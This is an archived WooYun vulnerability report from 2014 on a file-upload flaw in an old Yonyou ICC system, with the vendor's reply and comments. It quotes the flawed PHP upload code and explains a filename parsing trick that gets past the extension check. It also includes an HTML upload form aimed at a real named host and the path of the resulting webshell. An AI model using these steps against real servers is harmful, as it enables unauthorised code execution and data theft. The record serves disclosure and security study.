{"id": 2189, "wybug_id": "wooyun-2014-060435", "wybug_title": "用友某系统Getshell+用户敏感信息泄露", "wybug_corp": "用友软件", "wybug_author": "secmap", "wybug_date": "2014-05-14 18:57", "wybug_open_date": "2014-08-12 18:58", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-12：\t细节向公众公开  简要描述： 用友某系统多处Getshell+用户敏感信息泄露 详细说明：  #1 漏洞代码/5107/upload/upload.php/5107/upload/screenImagesSave.php\n$date = date(\"Ymd\");$dest = $CONFIG->basePath.'data/files/'.$date.\"/\";$COMMON->createDir($dest);$filename = paramsFmt(urldecode($_GET[\"filename\"]));$nameExt = strtolower($COMMON->getFileExtName($_FILES['file']['name']));$filenameExt = strtolower($COMMON->getFileExtName($filename));$allowedType = array('jpg', 'gif', 'bmp', 'png', 'jpeg','txt','zip','tgz','7z','doc','docx','log','xls','xlsx','ppt','pptx','rtf','pdf','rar');\tif(!in_array($nameExt, $allowedType) || !in_array($filenameExt,$allowedType)){\tif($ft == '1'){\t\techo 'pe';\t}else if($ft == '2'){\t\techo 'fe';\t}\t\texit;}$filenameNew = $dest.$filename;if(empty($_FILES[\"file\"]['error'])){\tmove_uploaded_file($_FILES[\"file\"][\"tmp_name\"],$filenameNew);}if(file_exists($filenameNew)){\techo(urlencode($CONFIG->baseUrl.'data/files/'.$date.\"/\".$filename));//\t@chmod($filenameNew, 0444);}else{\tif($ft == '1'){\t\techo 'pe';\t}else if($ft == '2'){\t\techo 'fe';\t}}\n其中 move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],$filenameNew);$filename参数是用户GET提交的，我们可以控制，虽然有文件类型的验证，但我们任然可以利用。方法：利用解析漏洞即可(不同的中间件，文件格式有所变化)，如：shell.php.a;.7z#2 利用方法保持如下代码为htm\n<html><form action=\"http://icc.hnair.com/5107/upload/screenImagesSave.php?filename=1.php.a;.7z\" name=\"test\" method=\"post\" enctype=\"multipart/form-data\">  <input type=\"file\" name=\"file\" >  <input type=\"submit\" value=\"upload\"></form></html>\n上传文件jpg格式的网马文件，上传 即可在/data/files/日期/下生成1.php.a;.7z#3 连接木马文件http://icc.hnair.com/data/files/20140416/1.php.a%3B.7z\n\n   漏洞证明：  #4 用户敏感信息泄露\n\n\n\n   修复方案：  #5 成功getshell\n\n   版权声明：转载请注明来源 secmap@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-05-15 09:10 厂商回复： 感谢 secmap@乌云 为我们提供的安全问题，此问题系旧版本ICC（4.0及之前版本）系统存在的问题，后经发现，我们已经提供了升级方案和升级包并通知用户，以解决此问题，我们将再次督促用户尽快升级系统。2010年5月以后，我们已经重新设计并迁移到J2EE上实现了web访问前端等重要功能模块（4.1以后版本），对系统安全相关特性做了增强，我们将努力为客户提供安全可靠的互联网呼叫中心软件产品。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-14 21:44 |    \t\tGrayTrack \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:14        | 灰色轨迹)\t\t \n  一公开这系统，你们都来挖了    \n     2014-05-14 21:49 |    \t\t【|→上善若水】 \t\t\t( 普通白帽子  |\t\t\t        Rank:127 漏洞数:25        | 【|→上善若水】)\t\t \n  哟，换马甲了    \n     2014-06-04 12:49 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  ICC老版本是PHP。新版吗，呵呵    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}